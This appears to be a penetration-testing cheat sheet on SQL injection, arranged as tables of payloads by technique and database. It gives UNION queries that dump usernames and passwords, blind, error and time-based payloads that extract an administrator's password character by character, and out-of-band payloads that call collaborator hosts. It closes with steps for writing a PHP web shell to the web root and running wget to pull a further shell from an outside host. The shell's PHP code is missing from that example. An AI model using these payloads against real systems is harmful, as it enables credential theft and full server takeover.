# Union Attack

## Determine # of columns

<table><thead><tr><th width="295">Info</th><th>Command</th></tr></thead><tbody><tr><td>Determine number of columns</td><td><code>' ORDER BY 1--</code></td></tr><tr><td>Determine number of columns</td><td><code>' ORDER BY 2--</code></td></tr><tr><td>Determine number of columns</td><td><code>' ORDER BY 3--</code></td></tr><tr><td>Determine number of columns</td><td><code>' UNION SELECT NULL--</code></td></tr><tr><td>Determine number of columns</td><td><code>' UNION SELECT NULL,NULL--</code></td></tr><tr><td>Determine number of columns</td><td><code>' UNION SELECT NULL,NULL,NULL--</code></td></tr><tr><td>Determine number of columns</td><td><code>' ORDER BY 1#</code></td></tr><tr><td>Determine number of columns</td><td><code>' ORDER BY 2#</code></td></tr><tr><td>Determine number of columns</td><td><code>' ORDER BY 3#</code></td></tr></tbody></table>

## Find useful data types

<table><thead><tr><th width="300">Info</th><th>Command</th></tr></thead><tbody><tr><td>Check column 1</td><td><code>'UNION SELECT 'a',NULL,NULL,NULL--</code></td></tr><tr><td>Check column 2</td><td><code>'UNION SELECT NULL,'a',NULL,NULL--</code></td></tr><tr><td>Check column 3</td><td><code>'UNION SELECT NULL,NULL,'a',NULL--</code></td></tr><tr><td>Check column 4</td><td><code>'UNION SELECT NULL,NULL,NULL,'a'--</code></td></tr><tr><td>Check column 4</td><td><code>'UNION SELECT NULL,NULL,NULL,'a'--</code></td></tr><tr><td>Oracle requires a from statement dual should work for all</td><td><code>'+UNION+SELECT+'abc','def'+FROM+dual--</code></td></tr></tbody></table>

## Retrieve interesting data

<table><thead><tr><th width="128">Info</th><th>Command</th></tr></thead><tbody><tr><td>Get data</td><td><code>' UNION SELECT username, password FROM users--</code></td></tr></tbody></table>

## Retrieving multiple values in a single column

<table><thead><tr><th width="145">Info</th><th>Command</th></tr></thead><tbody><tr><td>Oracle</td><td><code>' UNION SELECT username || '~' || password FROM users--</code></td></tr><tr><td>Microsoft</td><td><code>' UNION SELECT 'foo'+'bar' FROM users--</code></td></tr><tr><td>PostgreSQL</td><td><code>' UNION SELECT foo||bar FROM users--</code></td></tr><tr><td>PostgreSQL</td><td><code>' UNION SELECT username || '~' || password FROM users--</code></td></tr><tr><td>MySQL</td><td><code>' UNION SELECT 'foo' 'bar' FROM users--</code></td></tr><tr><td>MySQL</td><td><code>' UNION SELECT CONCAT('foo','bar') FROM users--</code></td></tr></tbody></table>

## Examining the database

### Database type and version

<table><thead><tr><th width="164">Database type</th><th>Query</th></tr></thead><tbody><tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr><tr><td>MySQL</td><td><code>SELECT @@version</code></td></tr><tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code></td></tr><tr><td>Oracle</td><td><code>SELECT version FROM v$instance</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table>

For example, you could use a UNION attack with the following input:

`' UNION SELECT @@version--`

### Listing the contents of the database

<table><thead><tr><th width="245">Info</th><th>Command</th></tr></thead><tbody><tr><td>Non Oracle - Show tables</td><td><code>SELECT TABLE_NAME FROM information_schema.tables</code></td></tr><tr><td>Non Oracle - Show columns</td><td><code>SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'Users'</code></td></tr><tr><td>Oracle - Show tables</td><td><code>SELECT * FROM all_tables</code></td></tr><tr><td>Oracle - Show columns</td><td><code>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'</code></td></tr></tbody></table>

## Blind SQL Injection

### With some kind of response

If the application acts differently but doesn't return data then the following techniques will be helpful.

<table><thead><tr><th width="303">Info</th><th>Command</th></tr></thead><tbody><tr><td>Verify that the users table exists</td><td><code>' AND (SELECT 'a' FROM users LIMIT 1)='a</code></td></tr><tr><td>Verify that the administrator user exists</td><td><code>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></td></tr><tr><td>Determine number of characters in administrator password (Greater than 1)</td><td><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</code></td></tr><tr><td>Determine number of characters in administrator password (Greater than 3)</td><td><code>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a</code></td></tr><tr><td>Test a character from the administrator password</td><td><code>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></td></tr></tbody></table>

### Completely Blind

#### Cause error responses

<table><thead><tr><th width="242">Info</th><th>Command</th></tr></thead><tbody><tr><td>Observer response time (Working)</td><td><code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a</code></td></tr><tr><td>Observer response time (No Working)</td><td><code>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</code></td></tr><tr><td>Verify user table exists</td><td><code>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code></td></tr><tr><td>Verify administrator exists in users table</td><td><code>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></td></tr><tr><td>Enumerate password size > 1</td><td><code>'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></td></tr><tr><td>Enumerate password size > 5</td><td><code>'||(SELECT CASE WHEN LENGTH(password)>5 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></td></tr><tr><td>Retrive data using this technique (First letter of password)</td><td><code>'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></td></tr><tr><td>Retrive data using this technique</td><td><code>' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a</code></td></tr></tbody></table>

#### Using time delays

<table><thead><tr><th width="192">Info</th><th>Command</th></tr></thead><tbody><tr><td>Test delay (Should not delay)</td><td><code>'; IF (1=2) WAITFOR DELAY '0:0:10'--</code></td></tr><tr><td>Test delay (Should delay)</td><td><code>'; IF (1=1) WAITFOR DELAY '0:0:10'--</code></td></tr><tr><td>Test a single character</td><td><code>'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--</code></td></tr><tr><td>PostgreSQL</td><td><code>' || pg_sleep(10)--</code></td></tr><tr><td>Microsoft</td><td><code>WAITFOR DELAY '0:0:10'</code></td></tr><tr><td>MySQL</td><td><code>SELECT sleep(10)</code></td></tr><tr><td>Oracle</td><td><code>dbms_pipe.receive_message(('a'),10)</code></td></tr><tr><td>Verify sleep clause</td><td><code>' || (SELECT CASE WHEN (1=1) then pg_sleep(10) else pg_sleep(-1)end)--</code></td></tr><tr><td>Verify administrator in users tables</td><td><code>' || (SELECT CASE WHEN (username='administrator') then pg_sleep(10) else pg_sleep(-1) end FROM users)--</code></td></tr><tr><td>Enumerate password size > 1</td><td><code>'||(SELECT CASE WHEN LENGTH(password)>1 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')--</code></td></tr><tr><td>Enumerate password size > 5</td><td><code>'||(SELECT CASE WHEN LENGTH(password)>5 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')--</code></td></tr><tr><td>Retrive data using this technique (First letter of password)</td><td><code>'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')--</code></td></tr></tbody></table>

#### Using out-of-band (OAST)

<table><thead><tr><th width="163">Info</th><th>Command</th></tr></thead><tbody><tr><td>Basic OAST - Microsoft</td><td><code>'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code></td></tr><tr><td>Blind OAST - Oracle with XXE</td><td><code>' UNION SELECT EXTRACTVALUE(xmltype('&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--</code></td></tr><tr><td>Blind OAST - PostgreSQL</td><td><code>copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</code></td></tr><tr><td>Blind OAST - MySQL</td><td><code>LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a') SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</code></td></tr></tbody></table>

### Write reverse shell with database

[https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/ ](https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/)

[https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)

<table><thead><tr><th width="247">Description</th><th>Command</th></tr></thead><tbody><tr><td>Check for write privileges</td><td><code>union select 1,2,3,concat(user(),0x3a,file_priv) from mysql.user--</code></td></tr></tbody></table>

If it says Y after your current user, then you are lucky and you have write privileges. Create a file to receive the shell

Now it's time to make use of MySQL statements. We're going to use INTO OUTFILE, which writes your selected rows onto a file. The basic syntax is:

select column\_name from table\_name into outfile "filepath/file.extension

Something like this should create a file named shell.php in the website directory and write that PHP code inside it:

`http://website.com/file.php?id=1 union select 1,"",3,4 INTO OUTFILE " /var/www/website/public_html/shell.php"`

#### Access the shell

Now we can access our shell by visiting http://website.com/shell.php?cmd=whoami. You can run any command after cmd=. You can now upload a ready-made shellcode to the server using curl or \`wget (on Linux servers):

`http://website.com/shell.php?cmd=wget http://othersite.com/shell.txt -O code.php`

And then you can access your shell with:

`http://website.com/code.php`
